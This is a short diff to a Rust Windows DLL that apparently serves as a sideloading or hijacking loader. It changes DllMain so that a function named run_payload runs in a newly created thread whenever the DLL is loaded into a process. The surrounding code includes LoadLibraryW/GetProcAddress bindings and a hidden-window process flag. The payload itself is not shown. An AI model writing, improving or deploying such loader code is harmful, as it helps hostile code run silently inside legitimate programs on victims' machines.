@@ -13,6 +13,7 @@ type LPVOID = *mut c_void;
 type HMODULE = *mut c_void;
 type FARPROC = *const c_void;
 type LPCWSTR = *const u16;
+type LPTHREAD_START_ROUTINE = unsafe extern "system" fn(LPVOID) -> DWORD;
 
 const DLL_PROCESS_ATTACH: DWORD = 1;
 const CREATE_NO_WINDOW: u32 = 0x0800_0000;
@@ -25,6 +26,15 @@ extern "system" {
     fn GetModuleFileNameW(h: HINSTANCE, buf: *mut u16, size: DWORD) -> DWORD;
     fn LoadLibraryW(name: LPCWSTR) -> HMODULE;
     fn GetProcAddress(h: HMODULE, name: *const u8) -> FARPROC;
+    fn CreateThread(
+        attr: LPVOID,
+        stack: usize,
+        start: LPTHREAD_START_ROUTINE,
+        param: LPVOID,
+        flags: DWORD,
+        id: *mut DWORD,
+    ) -> *mut c_void;
+    fn CloseHandle(h: *mut c_void) -> i32;
 }
 
 static DLL_DIR: OnceLock<PathBuf> = OnceLock::new();
@@ -69,6 +79,13 @@ fn run_payload(dir: &PathBuf) {
     }
 }
 
+unsafe extern "system" fn payload_thread(_: LPVOID) -> DWORD {
+    if let Some(dir) = DLL_DIR.get() {
+        run_payload(dir);
+    }
+    0
+}
+
 #[no_mangle]
 pub extern "system" fn DllMain(hinst: HINSTANCE, reason: DWORD, _r: LPVOID) -> BOOL {
     if reason == DLL_PROCESS_ATTACH {
@@ -82,7 +99,10 @@ pub extern "system" fn DllMain(hinst: HINSTANCE, reason: DWORD, _r: LPVOID) -> B
                 }
             }
         }
-        if let Some(dir) = DLL_DIR.get() { run_payload(dir); }
+        let t = unsafe { CreateThread(std::ptr::null_mut(), 0, payload_thread, std::ptr::null_mut(), 0, std::ptr::null_mut()) };
+        if !t.is_null() {
+            unsafe { CloseHandle(t); }
+        }
     }
     1
 }
